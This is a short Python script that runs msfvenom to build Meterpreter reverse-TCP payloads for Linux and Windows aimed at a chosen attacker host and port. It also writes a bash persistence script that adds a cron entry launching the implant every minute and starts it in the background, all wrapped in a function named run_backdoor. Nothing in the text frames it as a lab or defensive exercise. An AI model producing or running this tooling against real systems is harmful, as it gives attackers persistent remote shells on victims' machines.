import subprocess
import os

def generate_stagers(lhost, lport=4444):
    os.makedirs("payloads", exist_ok=True)
    
    
    subprocess.run([
        "msfvenom", "-p", "linux/x64/meterpreter/reverse_tcp",
        f"LHOST={lhost}", f"LPORT={lport}",
        "-f", "elf", "-o", "payloads/linux_x64_meter.elf"
    ], check=True)
    
    
    subprocess.run([
        "msfvenom", "-p", "linux/x86/meterpreter/reverse_tcp",
        f"LHOST={lhost}", f"LPORT={lport}",
        "-f", "elf", "-o", "payloads/linux_x86_meter.elf"
    ])
    
    
    subprocess.run([
        "msfvenom", "-p", "windows/x64/meterpreter/reverse_tcp",
        f"LHOST={lhost}", f"LPORT={lport}",
        "-f", "exe", "-o", "payloads/win_x64_meter.exe"
    ])
    
    # Persistence script
    with open("payloads/persist.sh", "w") as f:
        f.write(f"""#!/bin/bash
echo '* * * * * /tmp/linux_x64_meter.elf' | crontab -
chmod +x /tmp/linux_x64_meter.elf
/tmp/linux_x64_meter.elf &
""")
    
    print("[+] Stagers generated: payloads/*.elf *.exe")

def run_backdoor(lhost, lport=4444):
    generate_stagers(lhost, lport)